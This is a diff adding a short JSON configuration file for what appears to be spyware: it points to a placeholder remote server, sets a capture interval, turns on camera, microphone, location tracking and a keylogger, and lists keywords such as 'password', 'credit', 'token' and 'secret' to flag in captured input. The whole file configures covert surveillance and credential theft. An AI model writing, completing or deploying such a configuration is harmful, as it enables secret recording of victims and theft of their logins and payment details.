@@ -1,0 +1,11 @@
+{
+    "server_url": "http://YOUR_SERVER_IP:5000",
+    "capture_interval": 120,
+    "enable_camera": true,
+    "enable_mic": true,
+    "enable_location": true,
+    "enable_screenshot": false,
+    "enable_keylogger": true,
+    "ai_confidence_threshold": 0.6,
+    "keywords": ["password", "login", "credit", "secret", "token", "key"]
+}
